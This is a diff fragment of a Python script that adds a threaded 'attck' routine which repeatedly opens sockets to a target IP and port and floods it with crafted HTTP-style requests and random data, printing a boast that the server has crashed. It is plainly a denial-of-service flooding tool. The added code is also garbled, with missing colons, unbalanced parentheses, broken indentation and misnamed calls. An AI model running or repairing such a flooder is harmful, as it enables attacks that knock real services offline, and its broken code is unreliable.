@@ -377,8 +377,31 @@ def start():
         except:
             s.close()
             print('[+] server error')
-         
-for x in range(th):
+ def attck():
+  global userip,socks5
+   hh = random._urandom(5000)
+   lb = random.choice("[!]","[#]","[*]")
+   anjgall = "Anjing: "+random.choice(userip)+random.choice(socks5)+"\r\n"
+   content = "Content-Type: application/x-www-form-urlencoded\r\n"
+   length  = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+   main_req = anjgall + content + length + "\r\n"
+   while True
+         try:
+             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+             s.connect((str(ip),int(port)))
+             s.send(str.encode((main_req))
+             s.send(str.encode((data))
+             for i in range(pack):
+                 s.send(str.encode((main_req))
+                 s.send(str.encode((data)) 
+             xx += random.randint(0, int(pack))
+             print("SÉRVÉR {1} CRÂSH BY ZÁN")
+        except:
+            s.close()
+            print('[+] server error')
+  for x in range(th):    
   thred = threading.Thread(target=start)
   thred.start()
-  
+else:
+  thred = threading.thread(target=attck)
+  thred.start()
